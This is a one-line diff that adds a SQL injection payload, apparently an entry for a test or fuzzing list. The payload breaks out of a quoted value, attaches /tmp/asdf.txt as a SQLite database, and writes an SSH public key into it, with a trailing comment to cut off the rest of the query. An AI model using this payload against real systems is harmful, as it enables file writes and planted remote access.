@@ -1,0 +1,1 @@
+'); ATTACH DATABASE '/tmp/asdf.txt' AS db; CREATE TABLE IF NOT EXISTS oops (x TEXT); INSERT INTO oops VALUES ('ssh-rsa AAAAB3NzaC1yc2E...');--
